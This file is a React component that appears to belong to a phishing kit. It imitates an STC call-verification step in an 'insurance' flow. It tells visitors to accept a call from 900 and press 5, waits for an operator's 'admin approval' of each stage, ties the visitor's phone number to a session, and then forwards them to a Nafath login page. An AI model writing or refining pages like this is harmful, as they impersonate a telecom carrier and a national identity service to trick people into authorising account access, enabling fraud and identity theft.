import React, { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { CheckCircle2, Loader2, Info } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
import stcLogo from "@/assets/stc-logo.svg";

const STCCall = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const sc = t.stcCall;
  const offer = location.state?.offer;
  const phone = location.state?.phone;
  const carrier = location.state?.carrier;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [received, setReceived] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [showButton, setShowButton] = useState(false);
  const [countdown, setCountdown] = useState(10);

  const approvalStatus = useAdminApproval(orderId, "stc_call");

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success(sc.verified);
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/nafath-login", { state: { offer, phone, carrier, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error(sc.rejected);
      setWaitingApproval(false);
      setReceived(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier]);

  useEffect(() => {
    if (countdown <= 0) { setShowButton(true); return; }
    const id = setInterval(() => setCountdown(c => c - 1), 1000);
    return () => clearInterval(id);
  }, [countdown]);

  const handleCallReceived = async () => {
    setReceived(true);
    linkVisitorToSession({ phone });
    const id = await createOrUpdateStage(orderId, "stc_call");
    setOrderId(id);
    setWaitingApproval(true);
  };

  return (
    <VerificationLayout title={sc.title} subtitle="">
      <div className="px-5 pb-5 pt-6">
        {waitingApproval ? (
          <WaitingApprovalOverlay
            title={sc.waitingApproval}
            subtitle={sc.waitingPlease}
            icon="clock"
          />
        ) : (
          <motion.div
            className="space-y-3"
            initial={{ opacity: 0, y: 12 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4 }}
          >
            {/* Call animation */}
            <motion.div
              className="flex flex-col items-center gap-2"
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              transition={{ type: "spring", delay: 0.1 }}
            >
              <div className="w-20 h-20 rounded-2xl bg-[#11998e]/10 flex items-center justify-center">
                <img src="/images/call.gif" alt="calling" className="w-16 h-16" />
              </div>
              <img src={stcLogo} alt="STC" className="h-10 object-contain" />
            </motion.div>

            <div className="text-center">
              <h2 className="text-base font-bold text-foreground">{sc.title}</h2>
            </div>

            {/* Call info */}
            <motion.div
              className="rounded-xl border-2 border-border p-4 space-y-2 text-center"
              initial={{ opacity: 0, x: 10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.2 }}
            >
              <p className="text-xs text-muted-foreground">{sc.callInfo}</p>
              <p className="text-xs text-muted-foreground">{sc.fromNumber} <span className="font-bold text-[#11998e] font-mono" dir="ltr">900</span></p>
              <p className="text-sm font-bold text-foreground">{sc.acceptAndPress} <span className="text-[#11998e] text-lg">5</span></p>
            </motion.div>

            <p className="text-[10px] text-muted-foreground text-center">{sc.followInstructions}</p>

            {/* Countdown or Button */}
            {!received && showButton ? (
              <motion.button
                onClick={handleCallReceived}
                className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg"
                style={{ backgroundColor: '#11998e' }}
                whileTap={{ scale: 0.98 }}
                initial={{ opacity: 0, y: 8 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
              >
                <CheckCircle2 className="w-4 h-4" />
                <span>{sc.callReceived}</span>
              </motion.button>
            ) : !received ? (
              <div className="flex flex-col items-center gap-3 py-2">
                <div className="relative w-16 h-16">
                  <svg className="w-16 h-16 -rotate-90" viewBox="0 0 64 64">
                    <circle cx="32" cy="32" r="28" fill="none" stroke="hsl(var(--border))" strokeWidth="4" />
                    <motion.circle cx="32" cy="32" r="28" fill="none" stroke="#11998e" strokeWidth="4"
                      strokeLinecap="round" strokeDasharray={2 * Math.PI * 28}
                      initial={{ strokeDashoffset: 0 }} animate={{ strokeDashoffset: 2 * Math.PI * 28 }}
                      transition={{ duration: 10, ease: "linear" }} />
                  </svg>
                  <span className="absolute inset-0 flex items-center justify-center text-lg font-bold text-[#11998e] font-mono">{countdown}</span>
                </div>
                <p className="text-xs text-muted-foreground">{sc.waitingCall}</p>
              </div>
            ) : (
              <div className="flex items-center justify-center gap-2 py-4">
                <Loader2 className="w-5 h-5 text-[#11998e] animate-spin" />
                <p className="text-xs text-muted-foreground">{sc.verifyingData}</p>
              </div>
            )}

            {/* Info box */}
            <motion.div
              className="bg-[#11998e]/5 border border-[#11998e]/20 rounded-xl p-3.5 text-center"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.4 }}
            >
              <div className="flex items-center justify-center gap-1.5 mb-1">
                <Info className="w-3.5 h-3.5 text-[#11998e]" />
                <p className="text-xs font-bold text-foreground">عملية آمنة</p>
              </div>
              <p className="text-[10px] text-muted-foreground">{sc.secureProcess}</p>
            </motion.div>
          </motion.div>
        )}
      </div>
    </VerificationLayout>
  );
};

export default STCCall;
